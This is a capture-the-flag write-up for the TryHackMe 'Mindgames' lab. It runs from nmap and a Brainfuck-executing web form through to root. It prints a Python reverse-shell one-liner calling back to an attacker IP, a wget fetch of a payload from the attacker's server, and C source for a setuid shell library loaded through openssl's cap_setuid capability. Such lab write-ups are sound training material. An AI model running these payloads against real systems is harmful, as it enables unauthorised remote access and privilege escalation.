# Mindgames [THM](https://tryhackme.com/room/mindgames)

Let's see what this box has

```bash
nmap -sV -A -T4 -Pn 10.10.108.104

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 10:51 GMT
Nmap scan report for 10.10.108.104
Host is up (0.026s latency).
Not shown: 998 closed ports

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.11 seconds
```

Let's explore the service n port 80

```bash
curl http://10.10.108.104:80

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Mindgames.</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/main.css">
    <script src="/main.js"></script>
</head>

<body onload="onLoad()">
    <h1>Sometimes, people have bad ideas.</h1>
    <h1>Sometimes those bad ideas get turned into a CTF box.</h1>
    <h1>I'm so sorry.</h1> <!-- That's a lie, I enjoyed making this. -->
    <p>Ever thought that programming was a little too easy? Well, I have just the product for you. Look at the example code below, then give it a go yourself!</p>
    <p>Like it? Purchase a license today for the low, low price of 0.009BTC/yr!</p>
    <h2>Hello, World</h2>
    <pre><code>+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.</code></pre>
    <h2>Fibonacci</h2>
    <pre><code>--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.</code></pre>
    <h2>Try before you buy.</h2>
    <form id="codeForm">
        <textarea id="code" placeholder="Enter your code here..."></textarea><br>
        <button>Run it!</button>
    </form>
    <p></p>
    <label for="outputBox">Program Output:</label>
    <pre id="outputBox"></pre>
</body>
</html>
```

*We have an encoder/decoder?*

Pasting the first code we found on page into the textarea 

> +[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.

We get back

> Hello, world

---

Unfortunately, I wasn't able to get more information from my further enumeration.

---


Using the content (encoded) on the page I was able to find out that the encoding language used on this site is [brainfuck](https://www.dcode.fr/brainfuck-language).

We can see that by decoding some of the content on the page.

> +[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.

> print("Hello, World")


So I went on to encode the following code

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.21.99",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

which gave me a reverse shell from the server

```bash
nc -nvlp 4444

listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.108.104] 35686
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)

$ ls -ail /home
total 16
131074 drwxr-xr-x  4 root      root      4096 May 11  2020 .
     2 drwxr-xr-x 24 root      root      4096 May 11  2020 ..
539761 drwxr-xr-x  6 mindgames mindgames 4096 May 11  2020 mindgames
266998 drwxr-x---  5 tryhackme tryhackme 4096 May 11  2020 tryhackme

$ ls -ail /home/mindgames/
total 40
539761 drwxr-xr-x 6 mindgames mindgames 4096 May 11  2020 .
131074 drwxr-xr-x 4 root      root      4096 May 11  2020 ..
539770 lrwxrwxrwx 1 mindgames mindgames    9 May 11  2020 .bash_history -> /dev/null
539764 -rw-r--r-- 1 mindgames mindgames  220 May 11  2020 .bash_logout
539763 -rw-r--r-- 1 mindgames mindgames 3771 May 11  2020 .bashrc
539767 drwx------ 2 mindgames mindgames 4096 May 11  2020 .cache
539765 drwx------ 3 mindgames mindgames 4096 May 11  2020 .gnupg
539774 drwxrwxr-x 3 mindgames mindgames 4096 May 11  2020 .local
539762 -rw-r--r-- 1 mindgames mindgames  807 May 11  2020 .profile
539779 -rw-rw-r-- 1 mindgames mindgames   38 May 11  2020 user.txt
539769 drwxrwxr-x 3 mindgames mindgames 4096 May 11  2020 webserver

$ cat /home/mindgames/user.txt
thm{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

---

Going after the root flag wasn't easy I went through [linux enumeration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) and wasn't lucky.

Looking at other write-ups I noticed the use of [linPeas.sh](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh) so I went for it. LinPeas revealed 


```bash
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                 
Current capabilities:                                                                                        
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities:
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
```

Many tries and fails later I found this [gtfobins](https://gtfobins.github.io/gtfobins/openssl/#library-load)

```bash
Library load

It loads shared libraries that may be used to run code in the binary execution context.

    openssl req -engine ./lib.so
```

On my machine I created `openssl.c` which I then compiled to `openssl.so`

```bash
cat openssl.c

#include <unistd.h>

__attribute__((constructor))
static void init() {
    setuid(0);
    execl("/bin/sh", "sh", NULL);
}
```

```bash
gcc -fPIC -o openssl.o -c openssl.c
```

```bash
ls

total 16                                                                                                     
12452215 drwxr-xr-x 2 clobee 4096 Dec 28 18:19 .                                                             
10224705 drwxr-xr-x 3 clobee 4096 Dec 28 10:51 ..                                                            
12454536 -rw-r--r-- 1 clobee  122 Dec 28 18:18 openssl.c                                                     
12454535 -rw-r--r-- 1 clobee 1840 Dec 28 18:19 openssl.o
```

```bash                                                    
gcc -shared -o openssl.so -lcrypto openssl.o
```

```bash
ls                                                                            
total 32                                                                                                     
12452215 drwxr-xr-x 2 clobee  4096 Dec 28 18:19 .                                                            
10224705 drwxr-xr-x 3 clobee  4096 Dec 28 10:51 ..                                                           
12454536 -rw-r--r-- 1 clobee   122 Dec 28 18:18 openssl.c                                                    
12454535 -rw-r--r-- 1 clobee  1840 Dec 28 18:19 openssl.o                                                    
12454537 -rwxr-xr-x 1 clobee 16024 Dec 28 18:19 openssl.so   
```

I then started a HTTP server

```bash
python -m SimpleHTTPServer 8080 

Serving HTTP on 0.0.0.0 port 8080 ...                                                                        
10.10.151.253 - - [28/Dec/2020 18:24:06] "GET /openssl.so HTTP/1.1" 200 -  
```

and downloaded the `openssl.so` on the server

```bash
$ wget http://[ATTACKER_IP]:8080/openssl.so

--2020-12-28 18:24:04--  http://[ATTACKER_IP]:8080/openssl.so
Connecting to [ATTACKER_IP]:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16024 (16K) [application/octet-stream]
Saving to: ‘openssl.so’

     0K .......... .....                                      100%  618K=0.03s

2020-12-28 18:24:04 (618 KB/s) - ‘openssl.so’ saved [16024/16024]
```

```bash
$ chmod +x openssl.so

$ openssl req -engine ./openssl.so
id
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)

ls -ail /root
total 28
524292 drwx------  4 root root 4096 May 11  2020 .
     2 drwxr-xr-x 24 root root 4096 May 11  2020 ..
539760 lrwxrwxrwx  1 root root    9 May 11  2020 .bash_history -> /dev/null
525200 -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
539771 drwxr-xr-x  3 root root 4096 May 11  2020 .local
525201 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
539701 drwx------  2 root root 4096 May 11  2020 .ssh
539775 -rw-r--r--  1 root root   38 May 11  2020 root.txt

cat /root/root.txt
thm{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
